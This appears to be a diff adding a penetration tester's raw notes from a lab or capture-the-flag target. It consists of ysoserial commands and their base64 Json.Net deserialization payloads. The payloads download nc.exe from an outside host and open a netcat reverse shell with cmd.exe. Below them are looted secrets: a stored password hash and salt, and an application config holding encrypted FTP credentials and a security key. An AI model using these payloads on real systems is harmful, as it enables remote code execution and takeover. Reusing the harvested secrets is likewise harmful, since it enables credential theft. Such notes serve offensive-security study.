@@ -1,0 +1,47 @@
+D:\PT\tools\master-Release-29>.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "mkdir C:\\buggy"
+ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgbWtkaXIgQzpcXGJ1Z2d5J10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=
+
+
+
+
+D:\PT\tools\master-Release-29>.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell ; cd C:\\buggy ; wget 10.10.15.78:8000/nc.exe -OutFile nc.exe"
+ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCA7IGNkIEM6XFxidWdneSA7IHdnZXQgMTAuMTAuMTUuNzg6ODAwMC9uYy5leGUgLU91dEZpbGUgbmMuZXhlJ10NCiAgICB9LA0KICAgICdPYmplY3RJbnN0YW5jZSc6eyckdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5J30NCn0=
+
+
+
+D:\PT\tools\master-Release-29>.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "powershell ; C:\\buggy\\nc.exe 10.10.15.78 1122 -e cmd.exe"
+ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY21kJywnL2MgcG93ZXJzaGVsbCA7IEM6XFxidWdneVxcbmMuZXhlIDEwLjEwLjE1Ljc4IDExMjIgLWUgY21kLmV4ZSddDQogICAgfSwNCiAgICAnT2JqZWN0SW5zdGFuY2UnOnsnJHR5cGUnOidTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcywgU3lzdGVtLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OSd9DQp9
+
+
+
+            <Option Name="Pass">813CCFB086CB6C9046F13F1E10D5222ECB63E11A809C133580577B5597D28EB079F6DDD5AA52D1503BED569C72B589F165FC02993C51E0994A6290A0356EC2A0</Option>
+            <Option Name="Salt">cwl.PD(Zw&lt;EA-@&gt;ux6z,]l5U7]$Cr@cW?aD4~:j4&quot;%_*\6k&quot;Uk{1k@P7IX`.K7v0</Option>
+            <Option Name="Group"></Option>
+            <Option Name="Bypass server userlimit">0</Option>
+            <Option Name="User Limit">0</Option>
+            <Option Name="IP Limit">0</Option>
+            <Option Name="Enabled">1</Option>
+            <Option Name="Comments"></Option>
+            <Option Name="ForceSsl">0</Option>
+
+
+
+C:\Program Files\Sync2Ftp>type SyncLocation.exe.config
+type SyncLocation.exe.config
+<?xml version="1.0" encoding="utf-8" ?>
+<configuration>
+  <appSettings>
+    <add key="destinationFolder" value="ftp://localhost/"/>
+    <add key="sourcefolder" value="C:\inetpub\wwwroot\jsonapp\Files"/>
+    <add key="user" value="4as8gqENn26uTs9srvQLyg=="/>
+    <add key="minute" value="30"/>
+    <add key="password" value="oQ5iORgUrswNRsJKH9VaCw=="></add>
+    <add key="SecurityKey" value="_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%"/>
+  </appSettings>
+  <startup>
+    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.7.2" />
+  </startup>
+
+
+</configuration>
+
